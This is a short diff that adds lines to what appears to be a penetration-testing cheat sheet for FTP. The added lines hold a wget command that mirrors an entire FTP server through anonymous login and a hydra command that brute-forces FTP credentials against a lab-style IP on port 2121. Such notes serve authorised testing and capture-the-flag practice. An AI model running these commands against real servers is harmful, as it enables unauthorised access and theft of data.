@@ -27,3 +27,13 @@ binary           # Set binary mode (for shells)
 ```bash
 exiftool -u -a <file>
 ```
+
+### Download everything recursively
+```bash
+wget -m --no-passive ftp://anonymous:anonymous@<IP>
+```
+
+### Brute Force
+```bash
+hydra -L users.list -P passwords.list -s 2121 -f -vV 10.129.7.180 ftp
+```
